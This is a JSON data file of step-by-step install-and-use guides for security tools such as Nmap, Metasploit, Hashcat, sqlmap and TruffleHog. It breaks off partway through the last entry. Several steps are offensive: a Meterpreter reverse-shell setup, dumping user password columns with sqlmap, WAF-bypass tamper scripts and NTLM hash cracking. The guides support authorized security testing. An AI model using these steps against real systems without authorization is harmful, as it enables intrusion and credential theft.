@@ -1,0 +1,2413 @@
+{
+  "guides": [
+    {
+      "slug": "nmap",
+      "title": "How to Install and Use Nmap",
+      "description": "This guide covers installing Nmap, running your first scan, understanding output, and using common scan types for network reconnaissance.",
+      "prerequisites": [
+        "Linux, macOS, or Windows",
+        "Root/sudo access for SYN scans",
+        "A target you have permission to scan"
+      ],
+      "steps": [
+        {
+          "title": "Install Nmap",
+          "description": "Install Nmap using your system's package manager.",
+          "commands": [
+            {
+              "label": "Debian/Ubuntu",
+              "command": "sudo apt install nmap"
+            },
+            {
+              "label": "macOS",
+              "command": "brew install nmap"
+            },
+            {
+              "label": "Verify installation",
+              "command": "nmap --version"
+            }
+          ]
+        },
+        {
+          "title": "Run Your First Scan",
+          "description": "Start with a simple scan against a single target. This performs a SYN scan on the 1000 most common ports.",
+          "commands": [
+            {
+              "label": "Basic scan",
+              "command": "nmap scanme.nmap.org"
+            }
+          ],
+          "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for scanme.nmap.org (45.33.32.156)\nHost is up (0.089s latency).\nNot shown: 996 closed tcp ports\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n9929/tcp  open  nping-echo\n31337/tcp open  Elite",
+          "notes": "scanme.nmap.org is a server provided by the Nmap project specifically for testing. Don't scan targets you don't have permission to test."
+        },
+        {
+          "title": "Service and Version Detection",
+          "description": "Use the -sV flag to detect what software and version is running on each open port. This is essential for identifying potentially vulnerable services.",
+          "commands": [
+            {
+              "label": "Version detection",
+              "command": "nmap -sV scanme.nmap.org"
+            },
+            {
+              "label": "With OS detection",
+              "command": "sudo nmap -sV -O scanme.nmap.org"
+            }
+          ],
+          "notes": "OS detection (-O) requires root/sudo privileges because it uses raw packets."
+        },
+        {
+          "title": "Scan Specific Ports",
+          "description": "Target specific ports or port ranges instead of the default top 1000.",
+          "commands": [
+            {
+              "label": "Single port",
+              "command": "nmap -p 443 scanme.nmap.org"
+            },
+            {
+              "label": "Port range",
+              "command": "nmap -p 1-1000 scanme.nmap.org"
+            },
+            {
+              "label": "Common web ports",
+              "command": "nmap -p 80,443,8080,8443 scanme.nmap.org"
+            },
+            {
+              "label": "All 65535 ports",
+              "command": "nmap -p- scanme.nmap.org"
+            }
+          ],
+          "notes": "Scanning all 65535 ports (-p-) takes significantly longer but catches services running on non-standard ports."
+        },
+        {
+          "title": "NSE Scripts",
+          "description": "Nmap's Scripting Engine (NSE) has hundreds of scripts for vulnerability detection, service enumeration, and more.",
+          "commands": [
+            {
+              "label": "Default scripts",
+              "command": "nmap -sC scanme.nmap.org"
+            },
+            {
+              "label": "Version + scripts combo",
+              "command": "nmap -sC -sV scanme.nmap.org"
+            },
+            {
+              "label": "Specific script",
+              "command": "nmap --script http-title scanme.nmap.org"
+            },
+            {
+              "label": "Vulnerability scan",
+              "command": "nmap --script vuln scanme.nmap.org"
+            }
+          ],
+          "notes": "The -sC flag runs default scripts which are safe and informative. The vuln category scripts actively check for vulnerabilities - only use these on targets you're authorized to test."
+        },
+        {
+          "title": "Save Output",
+          "description": "Save scan results in different formats for later analysis and reporting.",
+          "commands": [
+            {
+              "label": "Normal output",
+              "command": "nmap -sV scanme.nmap.org -oN scan-results.txt"
+            },
+            {
+              "label": "XML output (for tools)",
+              "command": "nmap -sV scanme.nmap.org -oX scan-results.xml"
+            },
+            {
+              "label": "All formats at once",
+              "command": "nmap -sV scanme.nmap.org -oA scan-results"
+            }
+          ],
+          "notes": "XML output (-oX) can be imported into tools like Metasploit, EyeWitness, and many reporting platforms."
+        }
+      ]
+    },
+    {
+      "slug": "sherlock",
+      "title": "How to Install and Use Sherlock",
+      "description": "This guide covers installing Sherlock and using it to find usernames across hundreds of social media platforms and websites.",
+      "prerequisites": [
+        "Python 3.6+",
+        "pip"
+      ],
+      "steps": [
+        {
+          "title": "Install Sherlock",
+          "description": "Install Sherlock from pip or clone the repository.",
+          "commands": [
+            {
+              "label": "Via pip",
+              "command": "pip install sherlock-project"
+            },
+            {
+              "label": "Verify",
+              "command": "sherlock --version"
+            }
+          ]
+        },
+        {
+          "title": "Search for a Username",
+          "description": "Run a basic search for a username across all supported sites.",
+          "commands": [
+            {
+              "label": "",
+              "command": "sherlock targetusername"
+            }
+          ],
+          "output": "[*] Checking username targetusername on:\n[+] GitHub: https://github.com/targetusername\n[+] Twitter: https://twitter.com/targetusername\n[+] Instagram: https://instagram.com/targetusername",
+          "notes": "Replace 'targetusername' with the username you're investigating. Sherlock checks hundreds of sites, so it takes a minute or two."
+        },
+        {
+          "title": "Search Multiple Usernames",
+          "description": "Check several usernames in one run - useful when a target uses different handles on different platforms.",
+          "commands": [
+            {
+              "label": "",
+              "command": "sherlock username1 username2 username3"
+            }
+          ]
+        },
+        {
+          "title": "Save Results",
+          "description": "Export results to a file for documentation and reporting.",
+          "commands": [
+            {
+              "label": "Text output",
+              "command": "sherlock targetusername --output results.txt"
+            },
+            {
+              "label": "CSV output",
+              "command": "sherlock targetusername --csv"
+            },
+            {
+              "label": "Specific output folder",
+              "command": "sherlock targetusername --folderoutput ./results/"
+            }
+          ]
+        },
+        {
+          "title": "Filter and Refine",
+          "description": "Use flags to narrow your search or handle rate limiting.",
+          "commands": [
+            {
+              "label": "Only show found accounts",
+              "command": "sherlock targetusername --print-found"
+            },
+            {
+              "label": "Search specific sites",
+              "command": "sherlock targetusername --site github twitter instagram"
+            },
+            {
+              "label": "Add timeout for slow sites",
+              "command": "sherlock targetusername --timeout 10"
+            }
+          ],
+          "notes": "Some sites rate-limit or block automated requests. If you get false negatives, try increasing the timeout or using the --tor flag if you have Tor installed."
+        }
+      ]
+    },
+    {
+      "slug": "nuclei",
+      "title": "How to Install and Use Nuclei",
+      "description": "This guide covers installing Nuclei, running your first vulnerability scan, using templates, and building automated scanning workflows.",
+      "prerequisites": [
+        "Go 1.21+ (for go install) or download binary directly",
+        "A target URL you have permission to scan"
+      ],
+      "steps": [
+        {
+          "title": "Install Nuclei",
+          "description": "Install Nuclei and download the template library.",
+          "commands": [
+            {
+              "label": "Via Go",
+              "command": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+            },
+            {
+              "label": "Via Homebrew",
+              "command": "brew install nuclei"
+            },
+            {
+              "label": "Verify and download templates",
+              "command": "nuclei -update-templates"
+            }
+          ],
+          "notes": "On first run, Nuclei automatically downloads thousands of community templates from the nuclei-templates repository."
+        },
+        {
+          "title": "Run Your First Scan",
+          "description": "Scan a single URL with all default templates. This checks for thousands of known vulnerabilities, misconfigurations, and exposed files.",
+          "commands": [
+            {
+              "label": "",
+              "command": "nuclei -u https://example.com"
+            }
+          ],
+          "notes": "A full template scan can take several minutes. Nuclei is noisy - only scan targets you have explicit authorization to test."
+        },
+        {
+          "title": "Filter by Severity",
+          "description": "Focus on what matters by filtering templates by severity level.",
+          "commands": [
+            {
+              "label": "Critical and high only",
+              "command": "nuclei -u https://example.com -severity critical,high"
+            },
+            {
+              "label": "Medium and above",
+              "command": "nuclei -u https://example.com -severity medium,high,critical"
+            }
+          ]
+        },
+        {
+          "title": "Scan Multiple Targets",
+          "description": "Pipe a list of URLs into Nuclei for bulk scanning. This is how most real assessments work - you feed in URLs from tools like httpx or subfinder.",
+          "commands": [
+            {
+              "label": "From a file",
+              "command": "nuclei -l urls.txt"
+            },
+            {
+              "label": "Piped from httpx",
+              "command": "cat subdomains.txt | httpx -silent | nuclei"
+            },
+            {
+              "label": "With rate limiting",
+              "command": "nuclei -l urls.txt -rate-limit 50 -concurrency 10"
+            }
+          ],
+          "notes": "Rate limiting (-rate-limit) is important to avoid overwhelming targets or getting blocked. 50 requests per second is a reasonable starting point."
+        },
+        {
+          "title": "Use Specific Template Categories",
+          "description": "Run only specific types of checks instead of everything.",
+          "commands": [
+            {
+              "label": "Technology detection",
+              "command": "nuclei -u https://example.com -tags tech"
+            },
+            {
+              "label": "CVE checks only",
+              "command": "nuclei -u https://example.com -tags cve"
+            },
+            {
+              "label": "Exposed panels",
+              "command": "nuclei -u https://example.com -tags panel"
+            },
+            {
+              "label": "Specific template",
+              "command": "nuclei -u https://example.com -t cves/2024/"
+            }
+          ]
+        },
+        {
+          "title": "Save and Format Output",
+          "description": "Export findings in different formats for reporting.",
+          "commands": [
+            {
+              "label": "JSON output",
+              "command": "nuclei -u https://example.com -json -o findings.json"
+            },
+            {
+              "label": "Markdown report",
+              "command": "nuclei -u https://example.com -me report/"
+            }
+          ],
+          "notes": "The -me flag generates a markdown report directory with findings organized by severity. JSON output is best for feeding into other tools or dashboards."
+        }
+      ]
+    },
+    {
+      "slug": "metasploit",
+      "title": "How to Install and Use Metasploit",
+      "description": "This guide covers installing the Metasploit Framework, navigating the console, searching for exploits, and running your first exploit against a test target.",
+      "prerequisites": [
+        "Linux (Kali recommended) or macOS",
+        "Root/sudo access",
+        "A deliberately vulnerable target like Metasploitable for practice"
+      ],
+      "steps": [
+        {
+          "title": "Install Metasploit",
+          "description": "On Kali Linux, Metasploit is pre-installed. For other systems, use the installer script.",
+          "commands": [
+            {
+              "label": "Kali (already installed)",
+              "command": "msfconsole --version"
+            },
+            {
+              "label": "Other Linux/macOS",
+              "command": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall"
+            }
+          ]
+        },
+        {
+          "title": "Launch the Console",
+          "description": "Start the Metasploit console. First launch initializes the database which takes a moment.",
+          "commands": [
+            {
+              "label": "Start the database",
+              "command": "sudo msfdb init"
+            },
+            {
+              "label": "Launch console",
+              "command": "msfconsole"
+            }
+          ],
+          "output": "msf6 >",
+          "notes": "The database stores your scan results, credentials, and session history across sessions. Always initialize it before starting."
+        },
+        {
+          "title": "Search for Modules",
+          "description": "Metasploit has thousands of exploit, auxiliary, and post-exploitation modules. Search by keyword, CVE, or platform.",
+          "commands": [
+            {
+              "label": "Search by keyword",
+              "command": "search apache"
+            },
+            {
+              "label": "Search by CVE",
+              "command": "search cve:2021-44228"
+            },
+            {
+              "label": "Search by type",
+              "command": "search type:exploit platform:windows smb"
+            }
+          ]
+        },
+        {
+          "title": "Use a Module",
+          "description": "Select a module, configure its options, and understand what it does before running it.",
+          "commands": [
+            {
+              "label": "Select module",
+              "command": "use exploit/multi/handler"
+            },
+            {
+              "label": "Show options",
+              "command": "show options"
+            },
+            {
+              "label": "Set target",
+              "command": "set RHOSTS 192.168.1.100"
+            },
+            {
+              "label": "Set payload",
+              "command": "set PAYLOAD windows/meterpreter/reverse_tcp"
+            },
+            {
+              "label": "Set listener",
+              "command": "set LHOST 192.168.1.50"
+            },
+            {
+              "label": "Show configuration",
+              "command": "show options"
+            }
+          ],
+          "notes": "Always review options with 'show options' before running. RHOSTS is the target, LHOST is your machine. Never run exploits against systems you don't have explicit written authorization to test."
+        },
+        {
+          "title": "Run and Interact",
+          "description": "Execute the module and interact with any sessions you get.",
+          "commands": [
+            {
+              "label": "Run the exploit",
+              "command": "exploit"
+            },
+            {
+              "label": "List active sessions",
+              "command": "sessions -l"
+            },
+            {
+              "label": "Interact with session",
+              "command": "sessions -i 1"
+            },
+            {
+              "label": "Background session",
+              "command": "background"
+            }
+          ]
+        },
+        {
+          "title": "Auxiliary Modules",
+          "description": "Not everything is an exploit. Auxiliary modules handle scanning, enumeration, and information gathering.",
+          "commands": [
+            {
+              "label": "Port scanner",
+              "command": "use auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.1.0/24\nset PORTS 22,80,443,445\nrun"
+            },
+            {
+              "label": "SMB version scan",
+              "command": "use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun"
+            }
+          ],
+          "notes": "Auxiliary modules are great for the reconnaissance phase. They're less invasive than exploits and help you understand the target environment."
+        }
+      ]
+    },
+    {
+      "slug": "hashcat",
+      "title": "How to Install and Use Hashcat",
+      "description": "This guide covers installing Hashcat, identifying hash types, running dictionary attacks, and using rules for effective password cracking.",
+      "prerequisites": [
+        "A GPU with up-to-date drivers (NVIDIA CUDA or AMD ROCm)",
+        "Hashcat supports CPU-only mode but GPU is 10-100x faster"
+      ],
+      "steps": [
+        {
+          "title": "Install Hashcat",
+          "description": "Install Hashcat from your package manager or download the latest release.",
+          "commands": [
+            {
+              "label": "Debian/Ubuntu",
+              "command": "sudo apt install hashcat"
+            },
+            {
+              "label": "macOS",
+              "command": "brew install hashcat"
+            },
+            {
+              "label": "Verify GPU support",
+              "command": "hashcat -I"
+            }
+          ],
+          "notes": "hashcat -I shows detected compute devices. If your GPU doesn't appear, check your driver installation. On macOS, Metal is supported natively."
+        },
+        {
+          "title": "Identify the Hash Type",
+          "description": "Before cracking, you need to know what type of hash you're working with. Hashcat uses numeric mode codes for each hash type.",
+          "commands": [
+            {
+              "label": "List all hash modes",
+              "command": "hashcat --help | grep -i 'ntlm\\|md5\\|sha'"
+            },
+            {
+              "label": "Common modes",
+              "command": "# MD5 = -m 0\n# SHA1 = -m 100\n# SHA256 = -m 1400\n# NTLM = -m 1000\n# bcrypt = -m 3200\n# WPA2 = -m 22000"
+            }
+          ],
+          "notes": "Use the tool 'name-that-hash' or 'hashid' if you don't know what type of hash you have. NTLM hashes (from Windows) are mode 1000."
+        },
+        {
+          "title": "Dictionary Attack",
+          "description": "The most common attack mode. Try every word in a wordlist against the hash.",
+          "commands": [
+            {
+              "label": "Basic dictionary attack (MD5)",
+              "command": "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt"
+            },
+            {
+              "label": "NTLM hashes",
+              "command": "hashcat -m 1000 ntlm-hashes.txt /usr/share/wordlists/rockyou.txt"
+            },
+            {
+              "label": "Show cracked passwords",
+              "command": "hashcat -m 0 hashes.txt --show"
+            }
+          ],
+          "notes": "rockyou.txt is the classic starter wordlist with 14 million passwords. On Kali it's at /usr/share/wordlists/rockyou.txt.gz - unzip it first."
+        },
+        {
+          "title": "Rule-Based Attack",
+          "description": "Rules mutate each word in the wordlist - adding numbers, capitalizing letters, replacing characters. This massively increases coverage without needing a bigger wordlist.",
+          "commands": [
+            {
+              "label": "Best 64 rules (fast)",
+              "command": "hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+            },
+            {
+              "label": "Dive rules (thorough)",
+              "command": "hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule"
+            },
+            {
+              "label": "OneRule to rule them all",
+              "command": "hashcat -m 0 hashes.txt rockyou.txt -r OneRule.rule"
+            }
+          ],
+          "notes": "best64.rule is a great starting point - it's fast and catches common patterns. dive.rule is more aggressive. The community 'OneRule' combines the best from multiple rule sets."
+        },
+        {
+          "title": "Mask Attack (Brute Force with Patterns)",
+          "description": "When you know the password structure (like 'starts with uppercase, ends with 4 digits'), mask attacks are more efficient than pure brute force.",
+          "commands": [
+            {
+              "label": "8-char lowercase",
+              "command": "hashcat -m 0 hashes.txt -a 3 ?l?l?l?l?l?l?l?l"
+            },
+            {
+              "label": "Word + 4 digits",
+              "command": "hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d"
+            },
+            {
+              "label": "Custom charset",
+              "command": "hashcat -m 0 hashes.txt -a 3 -1 ?l?d ?1?1?1?1?1?1?1?1"
+            }
+          ],
+          "notes": "Mask charsets: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all. You can define custom charsets with -1, -2, -3, -4."
+        },
+        {
+          "title": "Session Management",
+          "description": "Long cracking jobs can be paused and resumed. Always use session names for important jobs.",
+          "commands": [
+            {
+              "label": "Named session",
+              "command": "hashcat -m 1000 hashes.txt rockyou.txt --session=client-ntlm"
+            },
+            {
+              "label": "Resume session",
+              "command": "hashcat --session=client-ntlm --restore"
+            },
+            {
+              "label": "Check status during run",
+              "command": "# Press 's' during a running session for status"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "sqlmap",
+      "title": "How to Install and Use sqlmap",
+      "description": "This guide covers installing sqlmap, testing for SQL injection, extracting databases, and using it effectively during web application assessments.",
+      "prerequisites": [
+        "Python 3",
+        "A target URL with parameters you have permission to test"
+      ],
+      "steps": [
+        {
+          "title": "Install sqlmap",
+          "description": "Install sqlmap from your package manager or clone from GitHub.",
+          "commands": [
+            {
+              "label": "Debian/Ubuntu",
+              "command": "sudo apt install sqlmap"
+            },
+            {
+              "label": "pip",
+              "command": "pip install sqlmap"
+            },
+            {
+              "label": "Verify",
+              "command": "sqlmap --version"
+            }
+          ]
+        },
+        {
+          "title": "Test a URL for SQL Injection",
+          "description": "Point sqlmap at a URL with a parameter and let it test for injection.",
+          "commands": [
+            {
+              "label": "Basic test",
+              "command": "sqlmap -u \"http://target.com/page?id=1\""
+            },
+            {
+              "label": "With cookie auth",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" --cookie=\"PHPSESSID=abc123\""
+            }
+          ],
+          "notes": "sqlmap will ask you questions during the scan - usually the defaults are fine. Add --batch to auto-accept defaults for unattended scans."
+        },
+        {
+          "title": "Enumerate Databases",
+          "description": "Once sqlmap confirms injection, enumerate the database structure.",
+          "commands": [
+            {
+              "label": "List databases",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" --dbs"
+            },
+            {
+              "label": "List tables in a database",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" -D targetdb --tables"
+            },
+            {
+              "label": "List columns in a table",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" -D targetdb -T users --columns"
+            }
+          ]
+        },
+        {
+          "title": "Extract Data",
+          "description": "Dump specific tables or columns from the database.",
+          "commands": [
+            {
+              "label": "Dump a table",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" -D targetdb -T users --dump"
+            },
+            {
+              "label": "Specific columns only",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" -D targetdb -T users -C username,password --dump"
+            },
+            {
+              "label": "First 10 rows",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" -D targetdb -T users --dump --start=1 --stop=10"
+            }
+          ],
+          "notes": "sqlmap will automatically attempt to crack password hashes it finds using its built-in dictionary. You can also export hashes to crack with hashcat."
+        },
+        {
+          "title": "POST Request and Form Testing",
+          "description": "Test POST parameters and form submissions, not just URL parameters.",
+          "commands": [
+            {
+              "label": "POST data",
+              "command": "sqlmap -u \"http://target.com/login\" --data=\"username=admin&password=test\" -p username"
+            },
+            {
+              "label": "From Burp request file",
+              "command": "sqlmap -r request.txt"
+            },
+            {
+              "label": "JSON body",
+              "command": "sqlmap -u \"http://target.com/api/search\" --data='{\"query\":\"test\"}' --content-type=\"application/json\""
+            }
+          ],
+          "notes": "The -r flag reads a full HTTP request saved from Burp Suite. This is the easiest way to test complex requests with cookies, headers, and custom content types."
+        },
+        {
+          "title": "Useful Flags",
+          "description": "Common flags for real-world usage.",
+          "commands": [
+            {
+              "label": "Auto-accept defaults",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" --batch"
+            },
+            {
+              "label": "Increase aggressiveness",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" --level=3 --risk=2"
+            },
+            {
+              "label": "Use specific technique",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" --technique=BEU"
+            },
+            {
+              "label": "Tamper scripts (WAF bypass)",
+              "command": "sqlmap -u \"http://target.com/page?id=1\" --tamper=space2comment,between"
+            }
+          ],
+          "notes": "Level 1-5 controls how many parameters/injection points to test. Risk 1-3 controls how dangerous the payloads are. Level 3 risk 2 is a good balance for thorough testing."
+        }
+      ]
+    },
+    {
+      "slug": "masscan",
+      "title": "How to Install and Use Masscan",
+      "description": "This guide covers installing Masscan, running fast port scans across large IP ranges, and piping results into Nmap for detailed analysis.",
+      "prerequisites": [
+        "Linux or macOS",
+        "Root/sudo access (required for raw packet sending)",
+        "A target range you have permission to scan"
+      ],
+      "steps": [
+        {
+          "title": "Install Masscan",
+          "description": "Install from package manager or build from source for the latest version.",
+          "commands": [
+            {
+              "label": "Debian/Ubuntu",
+              "command": "sudo apt install masscan"
+            },
+            {
+              "label": "macOS",
+              "command": "brew install masscan"
+            },
+            {
+              "label": "Verify",
+              "command": "masscan --version"
+            }
+          ]
+        },
+        {
+          "title": "Run a Basic Scan",
+          "description": "Scan common ports across a target range. Masscan requires root because it sends raw packets.",
+          "commands": [
+            {
+              "label": "Top ports on a /24",
+              "command": "sudo masscan 192.168.1.0/24 -p 22,80,443,445,3389 --rate=1000"
+            }
+          ],
+          "output": "Discovered open port 22/tcp on 192.168.1.10\nDiscovered open port 80/tcp on 192.168.1.1\nDiscovered open port 443/tcp on 192.168.1.50",
+          "notes": "The --rate flag controls packets per second. 1000 is conservative. Masscan can do 10 million pps but that will overwhelm most networks - start low."
+        },
+        {
+          "title": "Scan Large Ranges",
+          "description": "Masscan's strength is speed across large IP ranges. Scan entire subnets in seconds.",
+          "commands": [
+            {
+              "label": "Full /16 for web servers",
+              "command": "sudo masscan 10.0.0.0/16 -p 80,443 --rate=10000"
+            },
+            {
+              "label": "Multiple port ranges",
+              "command": "sudo masscan 10.0.0.0/16 -p 0-1023 --rate=5000"
+            },
+            {
+              "label": "Exclude ranges",
+              "command": "sudo masscan 10.0.0.0/8 -p 22 --rate=10000 --excludefile exclude.txt"
+            }
+          ],
+          "notes": "Always maintain an exclude file for IP ranges you must not scan (shared infrastructure, out-of-scope assets). One wrong scan can end an engagement."
+        },
+        {
+          "title": "Save Output for Nmap",
+          "description": "The classic workflow: Masscan finds open ports fast, then Nmap does detailed service detection on the results.",
+          "commands": [
+            {
+              "label": "Save as list",
+              "command": "sudo masscan 192.168.1.0/24 -p 1-65535 --rate=1000 -oL results.txt"
+            },
+            {
+              "label": "Save as XML (Nmap compatible)",
+              "command": "sudo masscan 192.168.1.0/24 -p 1-65535 --rate=1000 -oX results.xml"
+            },
+            {
+              "label": "Parse and feed to Nmap",
+              "command": "sudo masscan 192.168.1.0/24 -p 1-65535 --rate=1000 -oG results.gnmap\ngrep open results.gnmap | awk '{print $2}' | sort -u > live-hosts.txt\nnmap -sV -iL live-hosts.txt"
+            }
+          ]
+        },
+        {
+          "title": "Banners and Service Detection",
+          "description": "Masscan can grab basic banners from services it discovers.",
+          "commands": [
+            {
+              "label": "Banner grabbing",
+              "command": "sudo masscan 192.168.1.0/24 -p 80,443,22 --rate=1000 --banners"
+            },
+            {
+              "label": "With source port (bypass some firewalls)",
+              "command": "sudo masscan 192.168.1.0/24 -p 80,443 --rate=1000 --banners --source-port 61000"
+            }
+          ],
+          "notes": "Masscan's banner grabbing is basic compared to Nmap's service detection, but it's much faster for initial triage. Use it to identify what's there, then follow up with Nmap for detail."
+        }
+      ]
+    },
+    {
+      "slug": "trivy",
+      "title": "How to Install and Use Trivy",
+      "description": "This guide covers installing Trivy and scanning container images, filesystems, and git repos for vulnerabilities, misconfigurations, and secrets.",
+      "prerequisites": [
+        "Linux, macOS, or Windows",
+        "Docker (for scanning container images)"
+      ],
+      "steps": [
+        {
+          "title": "Install Trivy",
+          "description": "Install Trivy from your package manager or download the binary.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install trivy"
+            },
+            {
+              "label": "Debian/Ubuntu",
+              "command": "sudo apt install trivy"
+            },
+            {
+              "label": "Verify",
+              "command": "trivy version"
+            }
+          ]
+        },
+        {
+          "title": "Scan a Container Image",
+          "description": "Scan a Docker image for known vulnerabilities in OS packages and application dependencies.",
+          "commands": [
+            {
+              "label": "Scan an image",
+              "command": "trivy image python:3.11"
+            },
+            {
+              "label": "Critical and high only",
+              "command": "trivy image --severity CRITICAL,HIGH python:3.11"
+            },
+            {
+              "label": "Scan a local image",
+              "command": "trivy image myapp:latest"
+            }
+          ],
+          "notes": "Trivy downloads vulnerability databases on first run. It scans both OS-level packages (apt, apk, rpm) and language-specific dependencies (pip, npm, gem, etc.)."
+        },
+        {
+          "title": "Scan Your Project Directory",
+          "description": "Scan a local filesystem for vulnerabilities in lock files, IaC misconfigurations, and exposed secrets.",
+          "commands": [
+            {
+              "label": "Full filesystem scan",
+              "command": "trivy fs ."
+            },
+            {
+              "label": "Vulnerabilities only",
+              "command": "trivy fs --scanners vuln ."
+            },
+            {
+              "label": "Secrets only",
+              "command": "trivy fs --scanners secret ."
+            },
+            {
+              "label": "Misconfig only (Terraform, K8s, Docker)",
+              "command": "trivy fs --scanners misconfig ."
+            }
+          ]
+        },
+        {
+          "title": "Scan a Git Repository",
+          "description": "Scan a remote git repository without cloning it first.",
+          "commands": [
+            {
+              "label": "Scan a GitHub repo",
+              "command": "trivy repo https://github.com/owner/repo"
+            }
+          ]
+        },
+        {
+          "title": "CI/CD Integration",
+          "description": "Use Trivy in your build pipeline to catch vulnerabilities before deployment.",
+          "commands": [
+            {
+              "label": "Exit with error on critical",
+              "command": "trivy image --exit-code 1 --severity CRITICAL myapp:latest"
+            },
+            {
+              "label": "JSON output for parsing",
+              "command": "trivy image --format json --output results.json myapp:latest"
+            },
+            {
+              "label": "SARIF for GitHub Security",
+              "command": "trivy image --format sarif --output trivy.sarif myapp:latest"
+            }
+          ],
+          "notes": "The --exit-code 1 flag makes Trivy return a non-zero exit code when it finds vulnerabilities at the specified severity, which fails your CI pipeline. This is how you gate deployments on security."
+        }
+      ]
+    },
+    {
+      "slug": "gitleaks",
+      "title": "How to Install and Use Gitleaks",
+      "description": "This guide covers installing Gitleaks and scanning git repositories for accidentally committed secrets, API keys, and credentials.",
+      "prerequisites": [
+        "Git",
+        "Go (for go install) or download binary"
+      ],
+      "steps": [
+        {
+          "title": "Install Gitleaks",
+          "description": "Install Gitleaks from Homebrew, Go, or download the binary.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install gitleaks"
+            },
+            {
+              "label": "Go",
+              "command": "go install github.com/gitleaks/gitleaks/v8@latest"
+            },
+            {
+              "label": "Verify",
+              "command": "gitleaks version"
+            }
+          ]
+        },
+        {
+          "title": "Scan a Local Repository",
+          "description": "Scan the current git repository including all commit history for secrets.",
+          "commands": [
+            {
+              "label": "Scan current repo",
+              "command": "gitleaks detect"
+            },
+            {
+              "label": "Verbose output",
+              "command": "gitleaks detect -v"
+            }
+          ],
+          "output": "Finding:     AKIA...\nSecret:      AKIAIOSFODNN7EXAMPLE\nRuleID:      aws-access-key-id\nFile:        config/deploy.sh\nCommit:      abc1234...",
+          "notes": "Gitleaks scans the entire git history by default, not just current files. Secrets that were committed and then deleted are still found."
+        },
+        {
+          "title": "Scan Staged Changes Only (Pre-Commit)",
+          "description": "Use as a pre-commit hook to catch secrets before they're committed.",
+          "commands": [
+            {
+              "label": "Scan staged files",
+              "command": "gitleaks protect --staged"
+            },
+            {
+              "label": "Git pre-commit hook",
+              "command": "# Add to .git/hooks/pre-commit:\ngitleaks protect --staged --exit-code 1"
+            }
+          ],
+          "notes": "The protect command only checks staged changes, making it fast enough for a pre-commit hook. This catches secrets before they enter the git history."
+        },
+        {
+          "title": "Scan a Remote Repository",
+          "description": "Clone and scan a remote repository in one step.",
+          "commands": [
+            {
+              "label": "GitHub repo",
+              "command": "gitleaks detect --source https://github.com/owner/repo"
+            },
+            {
+              "label": "With report",
+              "command": "gitleaks detect --source https://github.com/owner/repo --report-format json --report-path report.json"
+            }
+          ]
+        },
+        {
+          "title": "Custom Configuration",
+          "description": "Customize what Gitleaks looks for with a config file, or exclude known false positives.",
+          "commands": [
+            {
+              "label": "Use custom config",
+              "command": "gitleaks detect --config custom-gitleaks.toml"
+            },
+            {
+              "label": "Generate baseline (ignore existing)",
+              "command": "gitleaks detect --baseline-path .gitleaks-baseline.json"
+            },
+            {
+              "label": "Scan with baseline",
+              "command": "gitleaks detect --baseline-path .gitleaks-baseline.json"
+            }
+          ],
+          "notes": "The baseline feature is useful for legacy repos with known committed secrets that can't be rotated. Generate a baseline once, then future scans only report new findings."
+        }
+      ]
+    },
+    {
+      "slug": "trufflehog",
+      "title": "How to Install and Use TruffleHog",
+      "description": "This guide covers installing TruffleHog and scanning git repos, filesystems, S3 buckets, and more for verified secrets and credentials.",
+      "prerequisites": [
+        "Go (for go install) or download binary"
+      ],
+      "steps": [
+        {
+          "title": "Install TruffleHog",
+          "description": "Install TruffleHog from Homebrew, pip, or download the binary.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install trufflehog"
+            },
+            {
+              "label": "pip",
+              "command": "pip install trufflehog"
+            },
+            {
+              "label": "Verify",
+              "command": "trufflehog --version"
+            }
+          ]
+        },
+        {
+          "title": "Scan a Git Repository",
+          "description": "Scan a repo's entire commit history for secrets. TruffleHog's key differentiator is that it verifies found secrets against the actual service to confirm they're live.",
+          "commands": [
+            {
+              "label": "Local repo",
+              "command": "trufflehog git file://./"
+            },
+            {
+              "label": "Remote repo",
+              "command": "trufflehog git https://github.com/owner/repo"
+            },
+            {
+              "label": "Only verified (live) secrets",
+              "command": "trufflehog git https://github.com/owner/repo --only-verified"
+            }
+          ],
+          "notes": "The --only-verified flag is powerful - it actually tests found credentials against AWS, GitHub, Slack, etc. to confirm they work. This dramatically reduces false positives."
+        },
+        {
+          "title": "Scan a Filesystem",
+          "description": "Scan a directory for secrets without git history.",
+          "commands": [
+            {
+              "label": "Scan current directory",
+              "command": "trufflehog filesystem ."
+            },
+            {
+              "label": "Scan specific path",
+              "command": "trufflehog filesystem /path/to/project"
+            }
+          ]
+        },
+        {
+          "title": "Scan GitHub Organizations",
+          "description": "Scan all repositories in a GitHub organization. Requires a GitHub token.",
+          "commands": [
+            {
+              "label": "Scan entire org",
+              "command": "trufflehog github --org=your-org --token=ghp_yourtoken"
+            },
+            {
+              "label": "Include members' repos",
+              "command": "trufflehog github --org=your-org --token=ghp_yourtoken --include-members"
+            }
+          ],
+          "notes": "Scanning an entire org is one of the most valuable things you can do for an organization's security posture. Many breaches start with leaked credentials in repos."
+        },
+        {
